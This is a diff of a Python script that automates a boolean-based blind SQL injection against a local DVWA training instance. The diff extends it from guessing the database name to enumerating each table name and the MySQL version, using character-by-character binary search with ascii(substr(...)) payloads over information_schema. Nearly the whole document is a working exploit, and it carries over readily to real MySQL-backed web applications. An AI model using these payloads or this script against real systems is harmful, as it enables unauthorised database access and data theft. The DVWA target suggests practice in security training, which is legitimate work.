@@ -2,46 +2,48 @@
 
 from pwn import *
 import requests
-import json
 import re
 from itertools import cycle
+import logging
 
 url = 'http://127.0.0.1/dvwa/vulnerabilities/sqli_blind'
 fixed_query = "?Submit=Submit&id=1"
 cookies = {
     'security': 'low',
-    'PHPSESSID': 'i1hhj8fif0o91oevusi2qld4ck'
+    'PHPSESSID': 'tskdd1ij8vplnbc7hnlcdpap4p'
 }
+# Enable verbose logging so we can see exactly what is being sent (info/debug)
+context.log_level = 'info'
 
 
 def sql_inject(sqli_pt1, variable, sqli_pt2):
     # Build up URL and execute SQLi
     next_url = url + fixed_query + sqli_pt1 + variable + sqli_pt2
-    print("Testing " + variable + " on \"" + next_url + "\"")
+    debug("Testing " + variable + " on \"" + next_url + "\"")
     return requests.get(next_url, cookies=cookies)
 
 
 def guess_len(guess_type, sqli_pt1, sqli_pt2):
     # Guess length of DB name, table count etc
-    for i in range(1, 100):
+    for i in range(0, 100):
         # Submit SQLi string
         response = sql_inject(sqli_pt1, str(i), sqli_pt2)
         # Extract the response we're interested in
         error_message = re.search(r'User.*\.', response.text).group(0)
-        print(error_message, end='\n\n')
+        debug(error_message)
         # If we've found the DB name length, return
         if "MISSING" not in error_message:
-            print(guess_type + str(i), end='\n\n')
+            success(guess_type + str(i) + '\n\n')
             return i
 
 
-def guess_db_name(db_name_len):
-    db_name = ""
-    for i in range(1, db_name_len + 1):
+def guess_name(guess_type, sqli_pt1, sqli_pt2, name_len, min_char_initial, max_char_initial):
+    name = ""
+    for i in range(1, name_len + 1):
+        # Need to reset all these after we find each char
         found_next_char = 0
-        # Here we only check lowercase a-z
-        min_char = ord('a')
-        max_char = ord('z')
+        min_char = min_char_initial
+        max_char = max_char_initial
         current_char = int((min_char + max_char) / 2)  # start half way through alphabet ('m')
         # Should we check greater than or less than?
         comparison_types = cycle(['<', '>'])
@@ -49,10 +51,10 @@ def guess_db_name(db_name_len):
 
         while(found_next_char != 2):
             # Submit SQLi string ('i' used for substring index, 'current_char' used for finding next char in name)
-            response = sql_inject("'+and+ascii(substr(database()," + str(i) + "," + str(i) + "))" + comparison, str(current_char), "+%23")
+            response = sql_inject(sqli_pt1 + str(i) + "," + str(i) + "))" + comparison, str(current_char), sqli_pt2)
             # Extract the response we're interested in
             error_message = re.search(r'User.*\.', response.text).group(0)
-            print(error_message, end='\n\n')
+            debug(error_message)
 
             # If ID shows "exists" then condition is true e.g. char > 97
             if "MISSING" not in error_message:
@@ -74,20 +76,39 @@ def guess_db_name(db_name_len):
                 found_next_char += 1
 
         # We found our char
-        db_name += chr(current_char)
-        print("Found char(" + str(i) + "): " + chr(current_char), end='\n\n')
+        name += chr(current_char)
+        info("Found char(" + str(i) + "): " + chr(current_char))
     # We got the whole DB name
-    print("DB Name: " + db_name)
-    return db_name
+    success(guess_type + name + '\n\n')
+    return name
 
 
+# Bullet-based SQLi
 # Get the length of DB name first (pass in print output + SQLi pt1/pt2)
-db_name_len = guess_len("DB Name Length: ", "'+and+length(database())+%3D", "+%23")
+db_name_len = guess_len("DB Name Length: ", "'+and+length(database())+=", "+%23")
 
 # Get the DB name
-db_name = guess_db_name(db_name_len)
+db_name = guess_name("DB Name: ", "'+and+ascii(substr(database(),", "+%23", db_name_len, ord('a'), ord('z'))
 
 # Get number of tables in the DB
 db_table_count = guess_len(
     "DB Table Count: ",
-    "'+and+(select+count+(table_name)+from+information_schema.tables+where+table_schema%3Ddatabase())%3D", "")
+    "'+and+(select+count(*)+from+information_schema.tables+where+table_schema=database())+=", "+%23")
+
+for table_no in range(db_table_count):
+    # Get length of table name
+    table_name_len = guess_len(
+        "Table Name Length: ",
+        "'+and+length(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1+offset+" + str(table_no) + "),1))+=",
+        "+%23")
+    # Guess table name - hardcoded length because unable to get
+    table_name = guess_name(
+        "Table Name: ",
+        "'+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1+offset+" + str(table_no) + "),",
+        "+%23",
+        table_name_len, ord('a'), ord('z'))
+
+# Finally, do our actual mission (get DB version)
+db_version_name_len = guess_len("DB Version Length: ", "'+and+length(@@version)+=", "+%23")
+# Here we check special chars, 0-9, A-Z, a-z etc
+db_version_name = guess_name("DB Version: ", "'+and+ascii(substr(@@version,", "+%23", db_version_name_len, ord(' '), ord('z'))
